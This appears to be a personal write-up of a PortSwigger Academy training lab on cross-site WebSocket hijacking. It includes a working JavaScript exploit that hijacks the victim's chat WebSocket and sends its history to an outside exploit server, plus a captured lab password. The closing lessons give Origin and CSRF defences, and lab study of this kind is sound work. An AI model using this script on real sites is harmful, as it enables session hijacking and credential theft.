# WebSockets Lab 2 — Cross-site WebSocket hijacking — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** WebSockets
**Lab:** Cross-site WebSocket hijacking
**Difficulty:** Practitioner
**Solved:** 27 November 2026 ~06:00 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed
**Instance:** https://0a8800f103535193803e035f005c005f.web-security-academy.net/
**Exploit server:** https://exploit-0ae8008a03f55199803f0268015600f1.exploit-server.net

## Vulnerability Type

Cross-site WebSocket hijacking (CSWSH) — the chat WebSocket handshake has no `Origin` check and no CSRF token, so any website the victim visits can open `wss://<instance>/chat` with the victim's cookies, send `"READY"`, and read the victim's full chat history — including credentials the victim shared with support.

## Solution

1. Stored this exploit on the lab's exploit server (POST `/`, `formAction=STORE`):
   ```html
   <script>
   var ws = new WebSocket('wss://0a8800f103535193803e035f005c005f.web-security-academy.net/chat');
   ws.onopen = function() { ws.send('READY'); };
   ws.onmessage = function(event) {
       fetch('https://exploit-0ae8008a03f55199803f0268015600f1.exploit-server.net/x?d='
             + encodeURIComponent(event.data), {mode: 'no-cors'});
   };
   </script>
   ```
   (No Burp Collaborator exists in this environment, so the exploit-server **access log** is the exfiltration channel instead — the same trick used for CSRF Lab 9.)
2. Delivered the exploit to the victim ("Deliver exploit to victim"). The victim bot opened the page, its browser opened the WebSocket with the victim's session cookies, and every history message was fetched to the exploit server.
3. Read the exploit-server access log. The victim's history contained:
   ```json
   {"user":"You","content":"I forgot my password"}
   {"user":"Hal Pline","content":"No problem carlos, it&apos;s 7yos7qzkhvxpioygglku"}
   ```
   The victim is **carlos** and the password is `7yos7qzkhvxpioygglku` (a per-instance random password — it dies with this instance).
4. Logged in as `carlos` / `7yos7qzkhvxpioygglku` — home page showed "Congratulations, you solved the lab!"

Full solver: `~/workspace/scripts/ps-websockets.py` (Lab 2).

## Practical Explanation

- **Why it works:** a WebSocket handshake is an HTTP request, so the browser attaches the victim's cookies automatically — and this endpoint never checked `Origin` or asked for a CSRF token, so a cross-origin page could use the victim's authenticated session. The `"READY"` command then returns the victim's stored chat history.
- **Why the access log:** the official solution exfiltrates to Burp Collaborator; this environment has no Collaborator client, but the exploit server logs every request it receives, so a `fetch()` with the data in the query string lands in the log where it can be read.
- **Gotcha found while solving:** the first version of the solver's credential regex only looked for the literal words "username … password …" — the history does not contain those words. The working pattern is Hal Pline's reply shape: `No problem <user>, it's <password>`.

## Lessons Learned

- WebSocket handshakes need the same defences as any state-changing request: validate `Origin` (and `Referer`) and require a per-session CSRF token.
- Never share passwords in a support chat — support staff should reset passwords, not read them back.
- An "exploit server" access log is a full exfiltration channel: any request the victim's browser makes to an attacker-controlled URL leaks data in the log.
